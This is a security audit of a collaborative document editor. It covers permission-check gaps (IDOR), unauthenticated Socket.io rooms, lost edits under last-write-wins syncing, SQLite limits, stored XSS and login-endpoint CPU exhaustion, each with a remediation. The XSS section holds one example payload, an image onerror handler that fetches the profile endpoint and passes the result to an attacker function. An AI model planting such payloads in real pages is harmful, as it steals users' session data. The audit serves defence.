# System Failure Cases & Vulnerabilities: Nexus Collaborative Suite

This audit highlights the critical failure cases, design vulnerabilities, and architectural bottlenecks present in the current system. These issues range from severe authorization bypasses to concurrency conflicts in real-time collaboration.

---

## 1. Critical Security Vulnerabilities (Authorization & Access Control)

### 🚨 Insecure Direct Object References (IDOR)
* **Description**: Although the system features a `Permission` database model (assigning "owner", "editor", and "viewer" roles to files), the backend routes for viewing, updating, and deleting files do **not** check these permissions.
* **Failure Cases**:
  * **Unauthorized Deletion**: Any logged-in user can delete *any file* in the database by sending a `DELETE` request to `/api/files/:id` (if they know or guess the UUID).
  * **Unauthorized Modification**: Any logged-in user can modify the content of any file by sending a `PUT` request to `/api/files/:id`.
  * **Unauthorized Reading**: Any logged-in user can read the content and activity logs of any file via `GET /api/files/:id`.
* **Remediation**: Check the `Permission` table in every file route before performing operations:
  ```javascript
  const userHasPermission = await prisma.permission.findFirst({
    where: { fileId: req.params.id, userId: req.user.id }
  });
  if (!userHasPermission) return res.status(403).json({ error: "Access denied" });
  ```

### 🚨 Unauthenticated WebSocket Connections
* **Description**: The WebSocket handler accepts socket connections and room-joins without validating the user's JWT auth token.
* **Failure Cases**:
  * An anonymous user can connect via Socket.io, join the room of any `fileId`, listen to editing changes, cursor movements, and comments, or send fake edits to disrupt the document.
* **Remediation**: Configure Socket.io middleware to verify the JWT token before allowing the connection to establish:
  ```javascript
  io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    // Verify JWT token here
  });
  ```

---

## 2. Concurrency & Synchronization Failures

### 🚨 Concurrency Collision ("Last-Write-Wins" Overwrites)
* **Description**: The real-time synchronization uses an operational-transformation (OT) engine simulator only on the client console. The server simply replaces the entire document content in the database using a **Last-Write-Wins (LWW)** strategy.
* **Failure Cases**:
  * **Lost Edits**: If User A and User B type simultaneously, User A's changes are sent to the server. Right after, User B's changes arrive. Because the server does not merge the changes, User A's work is completely overwritten by User B's entire page state.
* **Remediation**: Implement a real-time CRDT library like **Yjs** or **Automerge** to merge operations on the server side instead of saving full string representations.

### 🚨 Out-of-Order / Network Latency Race Conditions
* **Description**: If a user experiences latency or temporary disconnection, they continue typing locally.
* **Failure Cases**:
  * When their connection recovers, the client sends their stale local revision to the server, overwriting any edits made by other users in the meantime.

---

## 3. Database & Infrastructure Limitations

### 🚨 Ephemeral SQLite Datastore
* **Description**: The application uses a local SQLite file (`dev.db`).
* **Failure Cases**:
  * **Data Loss on Restart**: In serverless or ephemeral container deployments (like Vercel, free Render, or Hugging Face Spaces), the filesystem is wiped out whenever the container spins down or restarts. All registered users, documents, folders, and comments will be permanently deleted.
* **Remediation**: Migrate the Prisma datasource from SQLite to a cloud PostgreSQL database (e.g. Neon, Supabase).

### 🚨 SQLite Write Locks
* **Description**: SQLite locks the database file during write transactions.
* **Failure Cases**:
  * Under load (e.g., 5+ users typing simultaneously, sending debounced updates every second), the database will throw `SQLITE_BUSY: database is locked` exceptions, causing API write requests to fail.

---

## 4. Input Validation & Resilience Vulnerabilities

### 🚨 Lack of HTML Sanitization (Cross-Site Scripting - XSS)
* **Description**: The document editor (TipTap) saves content as raw HTML strings, which the backend saves and serves blindly without sanitization.
* **Failure Cases**:
  * A malicious collaborator can insert an XSS script payload (e.g., `<img src=x onerror="fetch('/api/auth/profile').then(r=>r.json()).then(d=>sendToAttacker(d))">`) inside a document. When another user opens the document, the script runs in their browser and steals their session tokens.
* **Remediation**: Use `dompurify` or `sanitize-html` on the server before saving or on the client before rendering HTML.

### 🚨 Denial of Service (DoS) via Bcrypt Spamming
* **Description**: The backend does not implement rate limiting.
* **Failure Cases**:
  * An attacker can spam the `/api/auth/login` or `/api/auth/register` endpoints with requests. Since `bcrypt` hashing is intentionally CPU-intensive, this will saturate the server's CPU and make the site unresponsive for all users.
* **Remediation**: Implement rate-limiting middleware (like `express-rate-limit`).
